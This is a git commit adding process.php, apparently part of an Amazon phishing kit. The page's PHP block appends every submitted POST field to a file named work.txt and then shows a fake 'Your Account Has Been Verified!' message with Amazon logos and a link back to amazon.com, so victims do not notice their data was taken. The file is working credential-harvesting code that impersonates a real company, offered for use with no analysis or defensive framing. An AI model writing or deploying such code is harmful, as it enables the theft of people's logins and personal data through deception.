310c8b0591a1f7fa4c8665a0d57980d530798948
AK-AR1022 <145460053+AK-AR1022@users.noreply.github.com>
2023-09-20 18:54:13 +0300

    Add files via upload

---
+++ process.php
@@ -0,0 +1,53 @@
+
+
+<link rel="shortcut icon" href="amazon30.png">
+
+<?php
+
+   file_put_contents('work.txt', print_r($_POST, true), FILE_APPEND);
+   
+?>
+
+<style>
+    .amazonlogo img{
+        
+        width: 100px;
+        margin-top: 5px;
+        margin-bottom: 70px;
+    }
+    .logo img{
+        height: px;
+        width: 50px;
+       
+    }
+    .greenlogo img{
+        height: px;
+        width: 100px;
+        margin-top: -20px;
+    }
+
+</style>
+
+<center><div class="container">
+
+<div class="amazonlogo">
+    <img src="nyamazon.png">
+</div>
+
+<div
+ class="logo"><img src="succes.png">
+</div>
+
+<a href=""></a>
+
+<h1>Thank you!</h1>
+
+<h3>Your Account Has Been Verified!</h3>
+
+
+<a href="https://www.amazon.com/">
+    <div class="greenlogo">
+    <img src="amazongreen.png">
+</div></a>
+
+</div></center>
